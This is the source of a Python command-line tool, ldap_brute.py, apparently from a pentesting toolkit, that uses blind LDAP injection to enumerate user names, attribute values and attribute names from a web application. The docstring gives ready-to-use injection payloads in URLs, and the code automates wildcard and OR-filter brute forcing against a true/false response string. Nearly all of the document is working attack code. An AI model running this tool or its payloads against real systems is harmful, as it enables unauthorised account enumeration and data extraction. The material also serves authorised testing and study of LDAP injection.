"""
Usage:
    python ldap_brute.py 'http://vulnerable/ldap/example2.php?name=%s)(cn=*))%%00&password=' 'AUTHENTICATED as'

    In this example, we inserted an expression into the param that will always
    return true if the parameter replaced by %s is true, in this case ennumerating
    all valid users. Your mission is to get an LDAP that will return TRUE-STRING
    when %s is TRUE, and will not return it when FALSE.

    Strings inserted look like 'a*', 'b*', 'c*'

Non-wildcard example:
    python ldap_brute.py --no-wildcard -a gidNumber -c 'digits' --max-word-size 5 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'

    Some LDAP attributes do not support wildcards, in which case you should use
    --no-wildcard. In this example, note how the %s needs to be placed right at the
    end of an always-true filter and its respective close parenthesis.

    Strings inserted look like
    "(|(gidNumber=0)(gidNumber=1)(gidNumber=2)(gidNumber=3)(gidNumber=4))..."
    (trimmed for brevity)

Bruteforcing attributes:
    python ldap_brute.py -A -c lower --max-word-size=4 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'

    Recommend only using -c 'lower', since using digits can cause invalid
    attributes (like '9c') to be mixed with valid attributes, which is not handled
    properly at all.

NOTE: Remember to quote the URL because bash! And also remember that % needs to
be escaped as %%, because python/printf.

CAVEAT: in wildcard search, if there are two users that begin with the same
string, but one is larger than the other, only the largest one will be
returned. E.g. if both admin and admin2 exist, when bruting in wildcard mode,
only admin2 will be returned.

Plase see for more info:

https://code.google.com/p/ldap-blind-explorer/
https://www.owasp.org/index.php/LDAP_injection
http://tools.ietf.org/html/rfc4519
http://web-for-pentester.pentesterlab.com/examples_of_web_vulnerabilities/ldap_attacks/
http://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf
http://www.ietf.org/rfc/rfc1960.txt
"""

from lib.common import succ, err, request_true
from lib import common

logging = common.logging

def brute(base_url, true_string):
    charset = common.charset_get()
    logging.info("Entering wildcard brute mode for URL '%s'." % base_url)
    logging.debug("Going to brute with chars %s" % charset)

    # Check which ones were positive.
    exist = []
    first = True
    while True:
        if first == True:
            first = False
            exist = common.brute_char(base_url, charset, true_string,  "")
            if exist:
                logging.info("Valid initial values found: %s", exist)
            else :
                err("""No initial values found! True string was never there... Maybe attribute does not support wildcard? see --no-wildcard. Otherwise, URL is non-conformant.""")
        else:
            new_exist = []
            finished = True
            for poss in exist:
                valid_continuations = common.brute_char(base_url, charset,
                    true_string, poss)

                if valid_continuations:
                    for v in valid_continuations:
                        finished = False
                        new_exist.append(poss + v)
                else:
                    new_exist.append(poss)

            if finished :
                break
            else :
                exist = new_exist

    return exist

# all parameters are arguments gotten from the command line.
def brute_nowild(base_url, true_string, attribute_name, word_size, max_path_size=8100, size_is_exact=False):
    bruting_attr = attribute_name == common.LDAP_GLOBALS.BRUTE
    if bruting_attr:
        logging.info("entering non-wildcard mode for url '%s' (bruteforcing attribute names)." % base_url)
    else:
        logging.info("entering non-wildcard mode for url '%s' (bruteforcing '%s')." % (base_url, attribute_name))

    # we are going to do (|(cn="a")(cn="b")[...]) until max_path_size so as to know if any of the
    # possibilities are valid.
    exist = []
    space_per_request = max_path_size - (len(base_url) - 2)
    or_subfilters = common.or_generate(space_per_request, attribute_name, word_size, size_is_exact)
    for or_subfilter in or_subfilters:
        url = base_url % or_subfilter
        if request_true(url, true_string):
            looper = common.or_loop(or_subfilter)
            for filt in looper:

                if request_true(base_url % filt, true_string):
                    if not bruting_attr:
                        found = filt[len(attribute_name)+2:-1]
                    else:
                        found = filt.split("=")[0][1:]

                    logging.info("Found value %s" % found)
                    exist.append(found)

    return exist

def main(args, output=True):

    common.charset_set(args.charset,
            args.charset_custom, args.wordlist)

    if not args.no_wildcard and not args.brute_attr:
        valid_values = brute(args.URL, args.TRUE_STRING)
    else :
        if args.brute_attr:
            attr = common.LDAP_GLOBALS.BRUTE
        else:
            attr = args.attribute_name

        if not attr:
            err("Attribute name is required for non-wildcard bruteforcing. Please specify it with --attribute-name.")

        if args.exact_word_size != None:
            is_exact = True
            word_size = args.exact_word_size
        else:
            is_exact = False
            word_size = args.max_word_size

        valid_values = brute_nowild(base_url=args.URL,
                true_string=args.TRUE_STRING, max_path_size=args.max_path_size,
                attribute_name=attr, word_size=word_size,
                size_is_exact=is_exact)

    if(output):
        succ(valid_values)

if __name__ == '__main__':
    parser = common.parser_get(__doc__)
    args = parser.parse_args()

    common.logging_set(args.verbosity)
    logging.debug(args)

    main(args)

